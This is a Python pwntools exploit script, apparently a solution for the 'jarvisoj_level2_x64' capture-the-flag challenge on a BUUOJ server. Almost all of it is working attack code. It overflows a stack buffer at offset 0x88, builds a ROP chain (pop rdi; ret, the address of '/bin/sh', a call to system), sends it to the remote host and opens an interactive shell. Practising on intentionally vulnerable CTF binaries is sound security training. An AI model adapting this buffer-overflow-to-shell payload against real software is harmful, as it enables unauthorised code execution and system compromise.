#!/usr/bin/python3.6
from pwn import *


filename = './jarvisoj_level2_x64'
e = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 27641)

log.level = 'DEBUG'
for k, v in e.got.items():
    log.debug(f'got:{k}={hex(v)}')

# ROPgadget --binary jarvisoj_level2_x64 --string '/bin/sh'
bin_sh_addr = 0x0000000000600a90
# ROPgadget --binary jarvisoj_level2_x64 --only 'pop|ret'
pop_rdi_ret = 0x00000000004006b3
call_system = 0x000000000040063e

ra_offset = 0x80+8
payload = b'0'*ra_offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(call_system)
p.sendline(payload)
p.interactive()
